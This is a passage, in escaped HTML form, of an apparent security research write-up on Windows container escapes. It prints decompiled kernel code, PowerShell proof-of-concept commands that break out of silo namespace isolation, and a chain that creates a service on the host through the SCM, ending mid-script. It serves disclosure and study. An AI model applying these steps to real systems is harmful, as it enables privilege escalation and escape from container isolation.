c14"&gt;==&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;SourceHive&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;return&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;SourceHive&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Flags&lt;/span&gt;&lt;span class="c18 c14"&gt;.&lt;/span&gt;&lt;span class="c8 c14"&gt;Trusted&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;return&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c33 c8 c14 c43"&gt;// Check trust list.&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Looking at &lt;/span&gt;&lt;span class="c2"&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can see where &lt;/span&gt;&lt;span class="c2"&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;is being used. If the current thread is in a server silo then all links are allowed between any hives. The check for the trusted state of the source hive only happens after this initial check so is bypassed. I&amp;rsquo;d speculate that during development the registry overlays couldn&amp;rsquo;t be marked as trusted so a symbolic link in an overlay would not be followed to a trusted hive it was overlaying, causing problems. Someone presumably added this bypass to get things working, but no one realized they needed to remove it when support for trusted overlays was added. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;To exploit this in a container I needed to find a privileged kernel component which would write to a registry key that I could control. I found a good primitive inside Win32k for supporting &lt;/span&gt;&lt;span class="c2"&gt;FlickInfo &lt;/span&gt;&lt;span&gt;configuration (which seems to be related in some way to touch input, but it&amp;rsquo;s not documented). When setting the configuration Win32k would create a known key in the current user&amp;rsquo;s hive. I could then redirect the key creation to the local machine hive allowing creation of arbitrary keys in a privileged location. I don&amp;rsquo;t believe this primitive could be directly combined with the registry silo escape issue but I didn&amp;rsquo;t investigate too deeply. At a minimum this would allow a non-administrator user to elevate privileges inside a container, where you could then use registry silo escape to write to the host registry.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The second issue was due to a call to &lt;/span&gt;&lt;span class="c2"&gt;OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class="c11"&gt;. This function would get the root object manager namespace directory for a silo.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b707cf6c019f63c17f1875a9222b84309df36302"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;POBJECT_DIRECTORY OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;PEJOB Silo&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;Silo&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; PPSP_STORAGE Storage &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;Silo&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Storage&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; PPSP_SLOT Slot &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;Storage&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Slot&lt;/span&gt;&lt;span class="c18 c14"&gt;[&lt;/span&gt;&lt;span class="c8 c14"&gt;PsObjectDirectorySiloContextSlot&lt;/span&gt;&lt;span class="c14 c18"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="c10 c4"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;Slot&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Present&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;return&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;Slot&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Value&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c10 c4"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;return&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;ObpRootDirectoryObject&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;We can see that the function will extract a storage parameter from the passed-in silo, if present it will return the value of the slot. If the silo is NULL or the slot isn&amp;rsquo;t present then the global root directory stored in &lt;/span&gt;&lt;span class="c2"&gt;ObpRootDirectoryObject &lt;/span&gt;&lt;span class="c11"&gt;is returned. When the server silo is set up the slot is populated with a new root directory so this function should always return the silo root directory rather than the real global root directory. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;This code seems perfectly fine, if the server silo is passed in it should always return the silo root object directory. The real question is, what silo do the callers of this function actually pass in? We can check that easily enough, there are only two callers and they both have the following code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4ca8904710ed15ca6deaf6ec0ad27027c57bdda9"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;PEJOB silo &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;PsGetCurrentSilo&lt;/span&gt;&lt;span class="c18 c14"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;Root &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;silo&lt;/span&gt;&lt;span class="c18 c14"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Okay, so the silo is coming from &lt;/span&gt;&lt;span class="c2"&gt;PsGetCurrentSilo&lt;/span&gt;&lt;span class="c11"&gt;. What does that do?&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a64a769036992ef6a76081a014f82c80df52b1c6"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;PEJOB PsGetCurrentSilo&lt;/span&gt;&lt;span class="c18 c14"&gt;()&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; PETHREAD Thread &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;PsGetCurrentThread&lt;/span&gt;&lt;span class="c18 c14"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; PEJOB silo &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;Thread&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Silo&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;silo &lt;/span&gt;&lt;span class="c18 c14"&gt;==&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;PEJOB&lt;/span&gt;&lt;span class="c18 c14"&gt;)-&lt;/span&gt;&lt;span class="c8 c14 c39"&gt;3&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; silo &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;Thread&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Tcb&lt;/span&gt;&lt;span class="c18 c14"&gt;.&lt;/span&gt;&lt;span class="c8 c14"&gt;Process&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;Job&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c14 c21"&gt;while&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;silo&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;silo&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;JobFlags &lt;/span&gt;&lt;span class="c18 c14"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;EJOB_SILO&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;break&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; silo &lt;/span&gt;&lt;span class="c18 c14"&gt;=&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;silo&lt;/span&gt;&lt;span class="c18 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c8 c14"&gt;ParentJob&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;return&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;silo&lt;/span&gt;&lt;span class="c18 c14"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c18 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;A silo can be associated with a thread, through impersonation or as can be one job in the hierarchy of jobs associated with a process. This function first checks if the thread is in a silo. If not, signified by the -3 placeholder, it searches for any job in the job hierarchy for the process for anything which has the &lt;/span&gt;&lt;span class="c2"&gt;JOB_SILO&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;flag set. If a silo is found, it&amp;rsquo;s returned from the function, otherwise NULL would be returned.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;This is a problem, as it&amp;rsquo;s not explicitly checking for a server silo. I mentioned earlier that there are two types of silo, application and server. While creating a new server silo requires administrator privileges, creating an application silo requires no privileges at all. Therefore to trick the object manager to using the root directory all we need to do is:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c38 lst-kix_xgd2a7n379wd-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;Create an application silo.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;Assign it to a process.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;Fully access the root of the object manager namespace.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;This is basically a more powerful version of the global symlink vulnerability but requires no administrator privileges to function. Again, as with the registry issue you&amp;rsquo;re still limited in what you can modify outside of the containers based on the token in the container. But you can read files on disk, or interact with ALPC ports on the host system.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;The exploit in PowerShell is pretty straightforward using my toolchain:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9f53c9246a6d008ba56f25c9d969ab14d33b9b5f"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c20"&gt;$root&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;= &lt;/span&gt;&lt;span class="c8 c37"&gt;Get-NtDirectory&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c36"&gt;&amp;quot;\&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c20"&gt;$root&lt;/span&gt;&lt;span class="c1"&gt;.FullPath&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;\&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c7"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$silo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;New-NtJob&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-CreateSilo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-NoSiloRootDirectory&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Set-NtProcessJob&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$silo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-Current&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c36"&gt;$root&lt;/span&gt;&lt;span class="c1"&gt;.FullPath&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;\Silos\748&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;To test the exploit we first open the current root directory object and then print its full path as the kernel sees it. Even though the silo root isn&amp;rsquo;t really a root directory the kernel makes it look like it is by returning a single backslash as the path.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;We then create the application silo using the New-NtJob command. You need to specify &lt;/span&gt;&lt;span class="c2"&gt;NoSiloRootDirectory &lt;/span&gt;&lt;span class="c11"&gt;to prevent the code trying to create a root directory which we don&amp;rsquo;t want and can&amp;rsquo;t be done from a non-administrator account anyway. We can then assign the application silo to the process.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Now we can check the root directory path again. We now find the root directory is really called &lt;/span&gt;&lt;span class="c2"&gt;\Silos\748&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;instead of just a single backslash. This is because the kernel is now using the root root directory. At this point you can access resources on the host through the object manager.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.7eqr86rbd62k"&gt;&lt;span class="c22 c34"&gt;Chaining the Exploits&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span&gt;We can now combine these issues together to escape the container completely from &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser&lt;/span&gt;&lt;span&gt;. First get hold of an administrator token through something like RogueWinRM, you can then impersonate it due to having &lt;/span&gt;&lt;span class="c2"&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class="c11"&gt;. Then you can use the object manager root directory issue to access the host&amp;rsquo;s service control manager (SCM) using the ALPC port to create a new service. You don&amp;rsquo;t even need to copy an executable outside the container as the system volume for the container is an accessible device on the host we can just access.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;As far as the host&amp;rsquo;s SCM is concerned you&amp;rsquo;re an administrator and so it&amp;rsquo;ll grant you full access to create an arbitrary service. However, when that service starts it&amp;rsquo;ll run in the host, not in the container, removing all restrictions. One quirk which can make exploitation unreliable is the SCM&amp;rsquo;s RPC handle can be cached by the Win32 APIs. If any connection is made to the SCM in any part of PowerShell before installing the service you will end up accessing the container&amp;rsquo;s SCM, not the hosts.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;To get around this issue we can just access the RPC service directly using &lt;/span&gt;&lt;span class="c2"&gt;NtObjectManager&amp;rsquo;s &lt;/span&gt;&lt;span class="c11"&gt;RPC commands. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c232b6e70023543f31524d3a8402d746252215e9"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$imp&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;= &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$token&lt;/span&gt;&lt;span class="c8 c17"&gt;.Impersonate()&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$sym_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c36"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$env:SystemDrive&lt;/span&gt;&lt;span class="c27 c8 c17"&gt;\symbols&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;mkdir&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$sym_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;|&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0 c33"&gt;Out-Null&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$services_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c36"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$env:SystemRoot&lt;/span&gt;&lt;span class="c8 c17 c27"&gt;\system32\services.exe&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c27 c8 c17"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$cmd&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c27 c8 c17"&gt;&amp;#39;cmd /C echo &amp;quot;Hello World&amp;quot; &amp;gt; \hello.txt&amp;#39;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c27 c8 c17"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c15 c8"&gt;# You can also use the following to run a container based executable.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c15 c8"&gt;#$cmd = Use-NtObject($f = Get-NtFile -Win32Path &amp;quot;demo.exe&amp;quot;) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17 c29"&gt;# &amp;nbsp; &amp;quot;&lt;/span&gt;&lt;span class="c8 c17 c29"&gt;\\.\GLOBALROOT&lt;/span&gt;&lt;span class="c8 c15"&gt;&amp;quot; + $f.FullPath&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c15 